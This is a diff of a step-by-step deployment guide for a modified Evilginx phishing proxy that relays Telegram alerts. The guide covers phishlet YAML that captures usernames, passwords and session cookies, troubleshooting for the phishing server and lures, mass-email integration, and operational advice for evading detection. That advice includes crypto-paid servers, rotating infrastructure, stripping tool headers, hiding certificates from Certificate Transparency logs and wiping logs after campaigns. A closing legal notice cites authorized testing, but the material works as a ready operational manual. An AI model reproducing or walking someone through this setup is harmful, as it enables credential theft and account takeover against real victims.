+| Key changed | `Host key verification failed` | Run `ssh-keygen -R IP` then reconnect |
 
-### 16.2 — Navigate to User Management
+## 2. "UFW commands fail"
 
-Click **"Users"** in the sidebar.
+| Symptom | Fix |
+|---------|-----|
+| `ufw: command not found` | Run `apt install ufw -y` |
+| `ERROR: already enabled` | Already on — run `ufw status` to check |
+| Can't SSH after enabling | Reinstall VPS (port 22 may be blocked by provider firewall) |
 
----
+## 3. "Port 53 still in use"
 
-### 16.3 — Add a New User
+Run this check:
+```bash
+lsof -i :53
+```
 
-Click **"Add User"**.
+If it shows a process:
+```bash
+# Find what's using it
+lsof -i :53 -P -n
 
-Fill in:
-- **Username:** (e.g., `operator1`)
-- **Password:** (strong password)
-- **Role:** Choose from:
-  - **Admin** — Full access, can manage users and settings
-  - **Operator** — Can view sessions, create lures, but can't change core config
-  - **Viewer** — Read-only access to sessions and stats
+# Kill it
+kill -9 <PID>
+```
 
-Click **"Save"**.
+If it's systemd-resolved again, the lock may have been removed:
+```bash
+chattr -i /etc/resolv.conf
+systemctl stop systemd-resolved
+systemctl disable systemd-resolved
+rm -f /etc/resolv.conf
+echo "nameserver 1.1.1.1" | tee /etc/resolv.conf
+chattr +i /etc/resolv.conf
+reboot
+```
 
----
+## 4. "go build fails"
 
-### 16.4 — Test the New User
+| Error | Fix |
+|-------|-----|
+| `go: not found` | `source ~/.bashrc` or reconnect SSH |
+| `go: go.mod file not found` | `cd /root/evilginx2` first |
+| `network timeout` | Try again — `go mod tidy && go build` |
+| Missing imports | `go clean -modcache && go mod tidy && go build` |
+| `command not found: git` | `apt install git -y` |
 
-1. Log out
-2. Log in as the new user
-3. Verify they have the correct permissions
-
----
-
-### 16.5 — View Audit Log
-
-All admin actions are logged. Click **"Audit Log"** in the sidebar to see:
-- Who logged in
-- Who created/deleted lures
-- Who changed settings
-- IP address of each action
-
----
-
-## PHASE 17 — Docker Deployment
-
-**Time: ~15 minutes | Where: Server terminal**
-
-### 🎯 Goal: Alternative deployment method using Docker (useful for testing or isolation)
-
----
-
-### 17.1 — Install Docker
+## 5. "DNS not resolving correctly"
 
 ```bash
-apt install -y docker.io docker-compose
-systemctl enable docker
-systemctl start docker
+# Check root domain
+dig @1.1.1.1 yourdomain.com +short
+
+# Check wildcard
+dig @1.1.1.1 test.yourdomain.com +short
+
+# Check TXT record
+dig @1.1.1.1 _acme-challenge.yourdomain.com TXT +short
+
+# Check nameservers
+whois yourdomain.com | grep "Name Server"
 ```
 
----
+**Both A records must return your VPS IP.**
+**Nameservers must show Cloudflare's.**
 
-### 17.2 — Build the Evilginx Docker Image
+## 6. "Certbot fails"
+
+| Error | Fix |
+|-------|-----|
+| `too many requests` | Wait 1 hour. Certbot has rate limits. |
+| `DNS challenge failed` | The TXT record wasn't found at the root domain. Check: `_acme-challenge.yourdomain.com` NOT `_acme-challenge.yourdomain.com.yourdomain.com` |
+| `certificate has expired` | Delete and reissue: `certbot delete --cert-name yourdomain.com` then run certbot again |
+| `certbot command not found` | `apt install certbot -y` |
+
+## 7. "Wildcard certificate not loading"
 
 ```bash
-cd /root/evilginx2
-docker build -t evilginx3-telegram .
-```
+# CHECK 1: Files exist?
+ls -la /root/.evilginx/crt/wildcard/
 
-**Expected duration:** 2-5 minutes.
+# CHECK 2: Correct subject?
+openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
+# SHOULD SHOW: subject = CN = *.yourdomain.com
 
----
+# CHECK 3: Domain set in config?
+cat /root/.evilginx/config.json | grep domain
 
-### 17.3 — Run Evilginx in Docker
+# CHECK 4: autocert is on?
+# Start evilginx, run 'config', check autocert is 'true'
 
-```bash
-docker run -d \
-  --name evilginx3 \
-  --restart unless-stopped \
-  -p 53:53/udp \
-  -p 80:80 \
-  -p 443:443 \
-  -p 5000:5000 \
-  -v evilginx-data:/home/evilginx/.evilginx \
-  evilginx3-telegram \
-  -dashboard 0.0.0.0:5000 \
-  -dashboard-user admin \
-  -dashboard-pass 'YourPassword123!'
-```
-
----
-
-### 17.4 — Verify It's Running
-
-```bash
-docker ps
-```
-
-**Expected output:** A table showing the `evilginx3` container as `Up` and running.
-
----
-
-### 17.5 — View Logs
-
-```bash
-docker logs -f evilginx3
-```
-
-Press `Ctrl + C` to exit.
-
----
-
-### 17.6 — Stop the Container
-
-```bash
-docker stop evilginx3
-docker rm evilginx3
-```
-
----
-
-## PHASE 18 — Phishlet Customization
-
-**Time: ~20 minutes | Where: Server terminal + Text editor**
-
-### 🎯 Goal: Create or modify a phishlet (YAML template) for a custom target
-
-**What is a phishlet?** A YAML file that tells Evilginx:
-- What URLs to proxy
-- What fields are the username/password
-- What cookies to capture
-- What the login page looks like
-
----
-
-### 18.1 — Anatomy of a Phishlet
-
-A phishlet is a YAML file. Here's the structure:
-
-```yaml
-name: 'example'
-author: 'Your Name'
-min_evilginx_version: '3.0.0'
-
-proxy_hosts:
-  - { phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true, is_landing: true }
-  - { phish_sub: 'www', orig_sub: 'www', domain: 'example.com', session: false, is_landing: false }
-
-sub_filters:
-  - { hostname: 'www.example.com', sub: 'www', domain: 'example.com', search: 'href="https://www\\.example\\.com', replace: 'href="https://{hostname}', mimes: ['text/html'] }
-
-auth_tokens:
-  - domain: '.example.com'
-    keys: ['session_id', 'auth_token']
-
-auth_urls:
-  - '/dashboard'
-  - '/home'
-
-credentials:
-  username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-```
-
-#### Key Sections Explained
-
-| Section | Purpose |
-|:--------|:--------|
-| `name` | Unique identifier for the phishlet |
-| `proxy_hosts` | Lists hostnames to intercept. The `phish_sub` is what victims see; `orig_sub` is the real site. |
-| `sub_filters` | URL rewrites (replace real URLs with phish URLs in proxied pages) |
-| `auth_tokens` | Cookies to capture (these are what give you authenticated access) |
-| `auth_urls` | URL paths that trigger session completion (e.g., after login, the dashboard) |
-| `credentials` | Form field names for username and password |
-
----
-
-### 18.2 — Create a Custom Phishlet
-
-Let's create a phishlet for a hypothetical site `example.com`:
-
-```bash
-nano /root/evilginx2/phishlets/example.yaml
-```
-
-Paste:
-
-```yaml
-name: 'example'
-author: 'Your Name'
-min_evilginx_version: '3.0.0'
-
-proxy_hosts:
-  - { phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true, is_landing: true }
-
-sub_filters:
-  - { hostname: 'login.example.com', sub: 'login', domain: 'example.com', search: 'https://login\\.example\\.com', replace: 'https://{hostname}', mimes: ['text/html'] }
-
-auth_tokens:
-  - domain: '.example.com'
-    keys: ['PHPSESSID', 'auth']
-
-auth_urls:
-  - '/dashboard'
-
-credentials:
-  username:
-    key: 'username'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-```
-
-Save and exit.
-
----
-
-### 18.3 — Test Your Phishlet
-
-Restart Evilginx:
-
-```bash
+# CHECK 5: Restart cleanly?
 systemctl restart evilginx
+journalctl -u evilginx -f | grep wildcard
 ```
 
-In Evilginx console:
-
-```
-phishlets
-```
-
-Your new phishlet should appear in the list. Enable it:
-
-```
-phishlets hostname example YOUR_DOMAIN
-phishlets enable example
-lures create example
-lures get-url 0
-```
-
-Test the URL in a browser.
-
----
-
-## PHASE 19 — OPSEC Hardening Checklist
-
-**Time: ~15 minutes | Where: Server terminal**
-
-### 🎯 Goal: Hide your server from detection and protect your operation
-
----
-
-### 19.1 — Hide Your Server IP
-
-If your server IP gets out, your operation is burned. To prevent this:
-
-#### ✅ Use Cloudflare Proxy (for non-phishing domains)
-For your legitimate domains, use Cloudflare's orange cloud proxy. This hides your server IP.
-
-#### ✅ Use Cloudflare Worker Fronting (Phase 4D)
-The Worker hides your VPS IP from all traffic.
-
-#### ✅ Don't Connect Your Server IP to Your Identity
-- Use cryptocurrency to buy VPS and domain
-- Don't log into personal accounts from the server
-- Don't use your server for anything else (no personal email, no browsing)
-
-#### ✅ Rotate Servers
-Every campaign, use a fresh VPS. Don't reuse the same server for long.
-
----
-
-### 19.2 — Strip Evilginx Headers
-
-By default, Evilginx adds headers like `X-Evilginx` that can be detected.
-
-Enable header stripping:
-
-```
-config strip_headers on
-```
-
-**Expected output:**
-```
-[inf] header stripping enabled - all Evilginx artifact headers will be removed
-```
-
----
-
-### 19.3 — Enable URL Rewriting
-
-Evilginx can rewrite URLs to remove the full phishing domain from the address bar.
-
-This is **always on** by default in this fork. To verify:
-
-```
-config
-```
-
-Look for `url_rewriting: on`.
-
----
-
-### 19.4 — Use a Dedicated User Agent for Bot Detection
-
-The bot detection is **always on**. But you can customize the bot blocklist:
-
-```
-blacklist verbose on
-```
-
-This shows detailed logs of which bots were blocked.
-
----
-
-### 19.5 — Enable Wildcard SSL (Already Done in Phase 7)
-
-If you skipped Phase 7, do it now. Without wildcard SSL, every phishing subdomain appears in crt.sh within hours.
-
-**Verify:**
-```bash
-ls /root/.evilginx/wildcard/
-```
-
-You should see `fullchain.pem` and `privkey.pem`.
-
----
-
-### 19.6 — Set Up IP Whitelisting (Optional)
-
-If you only target specific IP ranges:
-
-```
-config ip_whitelist on
-```
-
-Then add allowed IPs:
-
-```
-whitelist add 192.168.1.0/24
-```
-
-**⚠️ Use with caution** — this can lock you out if your IP changes.
-
----
-
-### 19.7 — Rotate Phishlets and Domains
-
-- Use **different domains** for different campaigns
-- Use **different subdomains** for each victim (this is automatic)
-- **Delete old lures** after each campaign:
-  ```
-  lures delete 0
-  lures delete 1
-  ```
-
----
-
-### 19.8 — Clear Logs After Campaigns
+## 8. "Dashboard not accessible"
 
 ```bash
-journalctl --vacuum-time=1d
-```
-
-Deletes logs older than 1 day.
-
-For Evilginx logs:
-
-```bash
-journalctl -u evilginx --vacuum-time=1d
-```
-
----
-
-### 19.9 — Encrypt Your Server
-
-Enable full disk encryption on your VPS (most providers offer this at setup time).
-
-If you didn't, you can use LUKS for additional data encryption:
-
-```bash
-apt install -y cryptsetup
-```
-
-> **⚠️ Warning:** This is advanced. Back up your data first.
-
----
-
-### 19.10 — Cloudflare-Specific OPSEC
-
-#### ✅ Disable Cloudflare's Automatic Platform Optimization (APO)
-If enabled, this caches your site on Cloudflare edges — which would break Evilginx.
-1. Click **Speed** → **Optimization** → **Content Optimization**
-2. Toggle **APO** to **OFF**
-
-#### ✅ Disable Rocket Loader
-Rocket Loader optimizes JS loading — and breaks Evilginx's proxying.
-1. Click **Speed** → **Optimization** → **Content Optimization**
-2. Toggle **Rocket Loader** to **OFF**
-
-#### ✅ Set Minimum TLS Version to 1.2
-1. Click **SSL/TLS** → **Edge Certificates**
-2. Set **"Minimum TLS Version"** to **1.2**
-> Why: TLS 1.0 and 1.1 are old and insecure. TLS 1.2 is the standard. TLS 1.3 is fine too but some targets may not support it.
-
-#### ✅ Disable Opportunistic Encryption
-1. Click **SSL/TLS** → **Edge Certificates**
-2. Toggle **"Opportunistic Encryption"** to **OFF**
-> Why: This can conflict with Evilginx's TLS termination.
-
----
-
-## PHASE 20 — Troubleshooting Encyclopedia
-
-**Time: Reference (use as needed) | Where: Server terminal**
-
-### 🎯 Goal: Solutions to EVERY common (and uncommon) problem
-
----
-
-### 🔴 Problem: "address already in use" on port 53, 80, or 443
-
-**Cause:** Another service is using the port.
-
-**Solution:**
-
-```bash
-# Find what's using the port
-ss -tulpn | grep :443
-# OR
-lsof -i :443
-
-# Common culprits and how to stop them:
-systemctl stop nginx
-systemctl stop apache2
-systemctl stop caddy
-systemctl stop systemd-resolved  # for port 53
-
-# Kill the process by PID
-kill -9 PID_NUMBER
-```
-
----
-
-### 🔴 Problem: "Permission denied" when SSH'ing
-
-**Cause:** Wrong username, wrong password, or wrong SSH key.
-
-**Solution:**
-
-1. Check your VPS provider's welcome email for the correct username (usually `root`)
-2. Reset the password from your provider's dashboard
-3. If using SSH key:
-   ```bash
-   ssh -i /path/to/your/key.pem root@YOUR_SERVER_IP
-   ```
-
----
-
-### 🔴 Problem: DNS not resolving (`dig` returns nothing)
-
-**Cause:** DNS not propagated, or Cloudflare proxy is on.
-
-**Solution:**
-
-1. Wait 5-10 minutes for DNS propagation
-2. Check Cloudflare:
-   - A record exists for `@` and `*`
-   - Both are **DNS Only** (grey cloud, NOT orange)
-   - TTL is set to "Auto"
-3. Verify from the server:
-   ```bash
-   dig @1.1.1.1 YOUR_DOMAIN +short
-   dig @1.1.1.1 random123.YOUR_DOMAIN +short
-   ```
-   Both should return your server IP.
-
----
-
-### 🔴 Problem: "Certificate verify failed" or browser shows SSL warning
-
-**Cause:** Wildcard cert is missing, expired, or in the wrong directory.
-
-**Solution:**
-
-1. Check the cert exists:
-   ```bash
-   ls -la /root/.evilginx/wildcard/
-   ```
-   You should see `fullchain.pem` and `privkey.pem`.
-
-2. Check it's a wildcard:
-   ```bash
-   openssl x509 -in /root/.evilginx/wildcard/fullchain.pem -noout -subject
-   ```
-   Output should show `CN = *.YOUR_DOMAIN`
-
-3. If missing, redo Phase 7.
-
-4. If expired, renew:
-   ```bash
-   certbot renew
-   cp /etc/letsencrypt/live/YOUR_DOMAIN/*.pem /root/.evilginx/wildcard/
-   systemctl restart evilginx
-   ```
-
----
-
-### 🔴 Problem: Telegram notifications not arriving
-
-**Cause:** Wrong token, wrong chat ID, or Telegram API blocked.
-
-**Solution:**
-
-1. Verify token:
-   ```bash
-   curl -s "https://api.telegram.org/botYOUR_TOKEN/getMe"
-   ```
-   Should return `"ok":true`.
-
-2. Verify chat ID:
-   ```bash
-   curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
-   ```
-   Look for `"chat":{"id":YOUR_CHAT_ID,...}`.
-
-3. Test manually:
-   ```bash
-   curl -s "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=test"
-   ```
-   You should receive a message.
-
-4. Check if Telegram is blocked in your country/VPS region. Try a different VPS location.
-
----
-
-### 🔴 Problem: Evilginx won't start (no error, just exits)
-
-**Cause:** Usually a config issue.
-
-**Solution:**
-
-```bash
-# Run Evilginx in the foreground to see errors
-cd /root/evilginx2
-./evilginx2 -debug
-```
-
-Look for error messages. Common ones:
-- `bind: address already in use` → Port conflict (see above)
-- `open /root/.evilginx/config.json: no such file` → Run `evilginx2` once to create it
-- `permission denied` → Run as root or fix file permissions
-
----
-
-### 🔴 Problem: Phishing page shows "404 Not Found"
-
-**Cause:** The phishlet doesn't match the URL, or the phishlet isn't enabled.
-
-**Solution:**
-
-1. Verify phishlet is enabled:
-   ```
-   phishlets
-   ```
-Status should be `enabled`.
-
-2. Verify the URL is correct:
-   ```
-   lures get-url 0
-   ```
-
-3. Verify the phishlet is for the right site:
-   ```
-   phishlets hostname office365 YOUR_DOMAIN
-   ```
-   The hostname must match what victims see.
-
----
-
-### 🔴 Problem: Sessions captured but cookies are empty
-
-**Cause:** The phishlet's `auth_tokens` section doesn't match the real site's cookies.
-
-**Solution:**
-
-1. Manually visit the real site (e.g., office.com) in a browser
-2. Open Developer Tools (`F12`) → Application → Cookies
-3. Note the exact cookie names
-4. Edit the phishlet:
-   ```bash
-   nano /root/evilginx2/phishlets/office365.yaml
-   ```
-5. Update the `auth_tokens` section with the correct cookie names
-6. Restart Evilginx:
-   ```bash
-   systemctl restart evilginx
-   ```
-
----
-
-### 🔴 Problem: Dashboard shows "502 Bad Gateway"
-
-**Cause:** Evilginx is not running, or it's listening on a different port.
-
-**Solution:**
-
-```bash
-# Check if Evilginx is running
+# Is Evilginx running?
 systemctl status evilginx
 
-# Check what port it's listening on
-ss -tulpn | grep evilginx
+# Is port 5000 open?
+ufw status | grep 5000
+# If not: ufw allow 5000/tcp
+
+# Is it listening?
+ss -tlnp | grep 5000
+# Should show: LISTEN 0 0 0.0.0.0:5000
+
+# Try SSH tunnel instead:
+ssh -L 5000:localhost:5000 root@95.133.228.19
+# Then visit http://localhost:5000
 ```
 
-If Evilginx is running but on port 5001 (not 5000), you started it with `-dashboard 0.0.0.0:5001`. Restart with the correct port.
+## 9. "Phishing page shows 'Not Secure'"
 
----
+| Cause | Fix |
+|-------|-----|
+| Chrome using HSTS | Type `thisisunsafe` on the error page (yes, really) |
+| Wildcard cert not loaded | See issue #7 above |
+| Cloudflare SSL wrong | Set SSL/TLS to **Full** (not Full Strict) |
+| DNS proxied (orange cloud) | Change to **DNS Only** (grey cloud) in Cloudflare |
+| Wrong domain in cert | Run `openssl x509 -in fullchain.pem -noout -subject` — must show `*.yourdomain.com` |
 
-### 🔴 Problem: High CPU/RAM usage
-
-**Cause:** Too many concurrent sessions, or the server is under attack.
-
-**Solution:**
-
-1. Check active sessions:
-   ```
-   sessions
-   ```
-2. Restart Evilginx:
-   ```bash
-   systemctl restart evilginx
-   ```
-3. If it's an attack, enable aggressive blacklisting:
-   ```
-   blacklist all
-   ```
-
----
-
-### 🔴 Problem: "go mod tidy" fails with network errors
-
-**Cause:** Go module proxy is blocked or slow.
-
-**Solution:**
+## 10. "No Telegram notifications"
 
 ```bash
-export GOPROXY=https://goproxy.io,direct
-export GO111MODULE=on
-cd /root/evilginx2
-go mod tidy
+# Step 1: Test bot is working
+curl -s "https://api.telegram.org/bot<TOKEN>/getMe"
+
+# Step 2: Get your chat ID (send message to bot first)
+curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates"
+
+# Step 3: Test from Evilginx
+# Start evilginx, at prompt: test telegram
+
+# Step 4: Check Evilginx logs
+journalctl -u evilginx -f | grep -i telegram
 ```
 
----
-
-### 🔴 Problem: "git pull" conflicts
-
-**Cause:** You've made local changes that conflict with the remote.
-
-**Solution:**
-
-If no custom changes:
-```bash
-git fetch origin
-git reset --hard origin/master
-```
-
-If you have custom changes to keep:
-```bash
-git stash
-git pull
-git stash pop
-# Manually resolve conflicts
-```
-
----
-
-### 🔴 Problem: Cloudflare showing "Error 1016 / 521"
-
-**Cause:** Cloudflare proxy can't reach your server.
-
-**Solution:**
-
-This means you have Cloudflare proxy (orange cloud) enabled but your server isn't set up to accept proxied traffic. Either:
-1. Switch to **DNS Only** (grey cloud) — recommended for Evilginx
-2. Or if you want proxy: set SSL to **Full**, ensure port 443 is open in UFW
-
----
-
-### 🔴 Problem: Out of disk space
-
-**Cause:** Too many session exports, logs, or backups.
-
-**Solution:**
+## 11. "Phishing page not loading (connection refused)"
 
 ```bash
-# Check disk usage
-df -h
+# Is Evilginx running?
+systemctl status evilginx
 
-# Clean up
-journalctl --vacuum-time=3d
-rm -rf /root/exports/sessions/*  # if already exported
+# Is port 443 open?
+ufw status | grep 443
+
+# Does DNS resolve?
+dig @1.1.1.1 login.yourdomain.com +short
+# MUST show your VPS IP
+
+# Check logs live
+journalctl -u evilginx -f
 ```
 
----
-
-### 🔴 Problem: Fail2ban locked you out
-
-**Cause:** Too many wrong SSH passwords.
-
-**Solution:**
+## 12. "GeoIP not working"
 
 ```bash
-# From VPS provider's web console
-fail2ban-client set sshd unbanip YOUR_IP
+# Files exist?
+ls -lh /root/.evilginx/GeoIP/
+
+# Flag is passed?
+ps aux | grep evilginx | grep geoip
+
+# Check startup logs
+journalctl -u evilginx -f | grep geoip
 ```
 
-Or wait 10 minutes — bans are temporary by default.
+## 13. "Sessions in dashboard but no data"
 
----
+This is normal if no credentials have been entered yet. The session shows who visited. Credentials appear only after the victim submits the login form.
 
-### 🔴 Problem: Phishlet enable fails with "could not get certificate"
+## 14. "Can't enable phishlet"
 
-**Cause:** Let's Encrypt rate limit, or DNS not pointing to your server.
-
-**Solution:**
-
-1. Check DNS:
-   ```bash
-   dig @1.1.1.1 random123.YOUR_DOMAIN +short
-   ```
-   Should return your server IP.
-
-2. Check Let's Encrypt rate limits:
-   - 50 certs/week per domain
-   - 5 duplicate certs/week
-
-3. If rate-limited, wait and use wildcard cert (Phase 7).
-
----
-
-### 🔴 Problem: Cloudflare Turnstile blocks all traffic
-
-**Cause:** Turnstile secret key is wrong, or the widget mode is too strict.
-
-**Solution:**
-
-1. Verify your site key and secret key in Cloudflare dashboard
-2. Try `Non-interactive` mode instead of `Invisible`
-3. Disable Turnstile: restart without `-turnstile` flag
-
----
-
-### 🔴 Problem: Custom redirector page not showing
-
-**Cause:** `redirect_key` not set, or wrong path.
-
-**Solution:**
-
-1. In Evilginx console:
-   ```
-   config redirect_key r
-   ```
-2. Verify the HTML file exists and has no errors
-3. Check Evilginx logs for file loading errors
-
----
-
-### 🔴 Problem: Cloudflare Worker returns 503
-
-**Cause:** Worker can't reach your VPS. VPS is down, or port is blocked.
-
-**Solution:**
-
-1. Check VPS is running: `systemctl status evilginx`
-2. Check UFW: `ufw status` — port 443 must be allowed
-3. Check Worker code: `VPS_IP` and `ALLOWED_HOSTS` must be correct
-
----
-
-### 🔴 Problem: Root domain shows Cloudflare error instead of landing page
-
-**Cause:** No Page Rule or Redirect Rule for root domain, or it's misconfigured.
-
-**Solution:**
-
-1. Check Page Rules (Phase 4B.5)
-2. Check Redirect Rules (Phase 4B.2)
-3. Make sure the rule doesn't block your lure paths (starting with `/l`)
-
----
-
-### 🆘 Still Stuck?
-
-1. **Check the logs:**
-   ```bash
-   journalctl -u evilginx -n 200 --no-pager
-   ```
-
-2. **Enable debug mode** (in Evilginx console):
-   ```
-   debug on
-   ```
-
-3. **Check the GitHub issues:**
-   [github.com/afrikaquality/evilginx2/issues](https://github.com/afrikaquality/evilginx2/issues)
-
----
-
-## PHASE 21 — Quick Command Reference
-
-**Time: Reference (print and keep)**
-
-### 🎯 Goal: One-page cheat sheet of all common commands
-
----
-
-### Server Management
-
-| Task | Command |
-|:-----|:--------|
-| SSH into server | `ssh root@YOUR_SERVER_IP` |
-| Update system | `apt update && apt upgrade -y` |
-| Reboot server | `reboot` |
-| Check disk space | `df -h` |
-| Check memory | `free -h` |
-| Monitor processes | `htop` |
-
-### Evilginx Management
-
-| Task | Command |
-|:-----|:--------|
-| Start (manual) | `cd /root/evilginx2 && ./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'PASS' -feed` |
-| Start (systemd) | `systemctl start evilginx` |
-| Stop (systemd) | `systemctl stop evilginx` |
-| Restart (systemd) | `systemctl restart evilginx` |
-| Check status | `systemctl status evilginx` |
-| View live logs | `journalctl -u evilginx -f` |
-| View last 100 lines | `journalctl -u evilginx -n 100 --no-pager` |
-
-### Core Config (inside `evilginx>`)
-
-| Task | Command |
-|:-----|:--------|
-| Set domain | `config domain YOUR_DOMAIN` |
-| Set IP | `config ipv4 external YOUR_IP` |
-| Set unauth URL | `config unauth_url https://www.google.com` |
-| Enable autocert | `config autocert on` |
-| Set Telegram token | `config teletoken YOUR_TOKEN` |
-| Set Chat ID | `config chatid YOUR_CHAT_ID` |
-| Enable Telegram | `config telegram_enabled on` |
-| Test Telegram | `test telegram` |
-| Show config | `config` |
-| Save and exit | `exit` |
-
-### Phishlet Management (inside `evilginx>`)
-
-| Task | Command |
-|:-----|:--------|
-| List phishlets | `phishlets` |
-| Set hostname | `phishlets hostname office365 YOUR_DOMAIN` |
-| Enable phishlet | `phishlets enable office365` |
-| Disable phishlet | `phishlets disable office365` |
-
-### Lure Management (inside `evilginx>`)
-
-| Task | Command |
-|:-----|:--------|
-| Create lure | `lures create office365` |
-| Get phishing URL | `lures get-url 0` |
-| List lures | `lures` |
-| Delete lure | `lures delete 0` |
-
-### Session Management (inside `evilginx>`)
-
-| Task | Command |
-|:-----|:--------|
-| List sessions | `sessions` |
-| View session details | `sessions 0` |
-| Delete session | `sessions delete 0` |
-| Clear all sessions | `sessions clear` |
-
-### Redirectors (inside `evilginx>`)
-
-| Task | Command |
-|:-----|:--------|
-| Set redirect key | `config redirect_key r` |
-| Set redirect URL | `config redirect_url https://YOUR_DOMAIN/redirectors/bounce.html` |
-
-### Auto-Export (inside `evilginx>`)
-
-| Task | Command |
-|:-----|:--------|
-| Enable JSON export | `auto-export enable json /root/exports/sessions/` |
-| Enable CSV export | `auto-export enable csv /root/exports/sessions/` |
-| Disable export | `auto-export disable` |
-
-### OPSEC (inside `evilginx>`)
-
-| Task | Command |
-|:-----|:--------|
-| Strip headers | `config strip_headers on` |
-| Blacklist mode | `blacklist unauth` |
-| Verbose blocking | `blacklist verbose on` |
-| Debug mode | `debug on` |
-| Debug off | `debug off` |
-
-### Updates
-
-| Task | Command |
-|:-----|:--------|
-| Check commit | `cd /root/evilginx2 && git log -1` |
-| Pull latest | `cd /root/evilginx2 && git pull` |
-| Rebuild | `cd /root/evilginx2 && go build -o evilginx2 .` |
-| Restart after update | `systemctl restart evilginx` |
-
-### Backups
-
-| Task | Command |
-|:-----|:--------|
-| Manual backup | `cd /root && ./backup-evilginx.sh` |
-| Check backups | `ls -la /root/backups/evilginx/` |
-| View cron jobs | `crontab -l` |
-
-### Cloudflare Checks
-
-| Task | Command |
-|:-----|:--------|
-| Check DNS | `dig @1.1.1.1 YOUR_DOMAIN +short` |
-| Check wildcard DNS | `dig @1.1.1.1 random.YOUR_DOMAIN +short` |
-| Check TXT record | `dig @1.1.1.1 _acme-challenge.YOUR_DOMAIN TXT +short` |
-| Check SSL cert | `openssl x509 -in /root/.evilginx/wildcard/fullchain.pem -noout -subject` |
-
----
-
-## 🎉 YOU'RE DONE!
-
-If you completed all 21 phases, you have a **production-grade Evilginx3 Telegram Edition deployment** with:
-
-✅ **Core system:** Built from source, running 24/7, auto-restart on crash  
-✅ **Wildcard SSL:** Hidden from Certificate Transparency logs  
-✅ **Telegram:** Real-time phone notifications  
-✅ **Dashboard:** Beautiful web interface for management  
-✅ **Live Feed:** Real-time session stream  
-✅ **Auto-Export:** Sessions saved automatically  
-✅ **Backups:** Daily encrypted backups  
-✅ **Systemd:** Starts on boot, auto-restarts on failure  
-✅ **GoPhish:** Integrated for mass email campaigns  
-✅ **Multi-User:** Team access with role-based permissions  
-✅ **OPSEC:** Hardened against detection  
-✅ **Cloudflare DNS:** A records, wildcard records, DNS Only mode  
-✅ **Cloudflare SSL:** Full mode, Always Use HTTPS  
-✅ **Cloudflare WAF:** Scanner blocking, country blocking, rate limiting  
-✅ **Cloudflare Redirect Rules:** Root domain redirect, bot path traps  
-✅ **Cloudflare Page Rules:** Cache bypass for lures, security disable  
-✅ **Cloudflare Workers:** Traffic fronting to hide VPS IP  
-✅ **Cloudflare Turnstile:** CAPTCHA before phishing page loads  
-✅ **Cloudflare Caching:** Bypass for phishing pages, minify enabled  
-✅ **Custom Redirectors:** Post-auth pages (loading, account locked, bounce)  
-✅ **Custom Landing Pages:** Fake business site for root domain  
-✅ **Troubleshooting:** Solutions to every common problem  
-✅ **Quick Reference:** Complete command cheat sheet
-
-### 📊 Performance Expectations
-
-On a **$3.50/month VPS** (1 vCPU, 1 GB RAM):
-- **Concurrent sessions:** 100-500
-- **Memory usage:** 50-200 MB
-- **CPU usage:** 5-15% average
-- **Telegram latency:** 1-3 seconds
-
-### 🚀 Next Steps
-
-1. **Give your [README.md](README.md) a read** for the full feature overview
-2. **Experiment** with different phishlets
-3. **Create custom phishlets** (Phase 18) for your specific targets
-4. **Monitor** your dashboard regularly
-5. **Rotate** servers and domains between campaigns
-6. **Back up** your config after every change
-
-### ⚖️ Legal Notice
-
-This tool is for **authorized penetration testing and security research only**. Unauthorized use against systems you don't own is illegal. Always get written permission before testing.
-
----
-
-<p align="center">
-  <strong>🎯 You now have a tool that 99% of "phishing kits" can't compete with. Use it wisely.</strong>
-</p>
-
-<p align="center">
-  <sub>Built with ☕ by the afrikaquality team · Last updated: July 2026</sub>
-</p>
 ```
+phishlets enable office365
+```
+
+If it fails:
+1. First set hostname: `phishlets hostname office365 yourdomain.com`
+2. Make sure the phishlet YAML file exists in `/root/evilginx2/phishlets/`
+3. Check autocert is on: `config autocert on`
+4. Check domain is set: `config domain yourdomain.com`
+
+## 15. "Server runs out of memory"
+
+Evilginx uses about 30-50 MB RAM normally. If you see high usage:
+
+```bash
+# Check memory
+free -h
+
+# Check what's using it
+htop
+
+# Restart to clear sessions
+systemctl restart evilginx
+```
+
+---
+
+# PART 20: FINAL VERIFICATION CHECKLIST
+
+## Run Through Every Step to Confirm Success
+
+### ✅ Server Setup
+- [ ] SSH login works
+- [ ] System updated (`apt update && apt upgrade`)
+- [ ] All packages installed
+- [ ] Firewall active with correct ports (22, 53, 80, 443, 5000)
+- [ ] Port 53 free (systemd-resolved disabled)
+- [ ] DNS resolves through Cloudflare
+
+### ✅ Evilginx Build
+- [ ] Go installed (`go version`)
+- [ ] Repository cloned
+- [ ] Binary built (`ls -lh evilginx2` → ~25MB)
+- [ ] Config directory created
+
+### ✅ DNS & Cloudflare
+- [ ] Domain added to Cloudflare
+- [ ] Nameservers changed at registrar
+- [ ] A records: `@` and `*` → VPS IP (grey cloud)
+- [ ] SSL/TLS set to "Full" (not Full Strict)
+- [ ] Always Use HTTPS ON
+- [ ] `dig @1.1.1.1 yourdomain.com +short` → VPS IP
+- [ ] `dig @1.1.1.1 test.yourdomain.com +short` → VPS IP
+
+### ✅ Wildcard Certificate
+- [ ] Cert obtained from Let's Encrypt
+- [ ] TXT record verified with `dig`
+- [ ] Certificate copied to `/root/.evilginx/crt/wildcard/`
+- [ ] Subject shows `*.yourdomain.com`
+- [ ] Correct permissions set
+- [ ] Evilginx starts with `[wld] using wildcard certificate`
+
+### ✅ Telegram
+- [ ] Bot created with @BotFather
+- [ ] Token tested with `curl .../getMe`
+- [ ] Chat ID obtained
+- [ ] Test message received
+- [ ] `config teletoken` and `config chatid` set
+- [ ] `test telegram` succeeds
+
+### ✅ GeoIP
+- [ ] `GeoLite2-City.mmdb` downloaded
+- [ ] `GeoLite2-ASN.mmdb` downloaded
+- [ ] Files in `/root/.evilginx/GeoIP/`
+- [ ] `-geoip-db` flag in startup
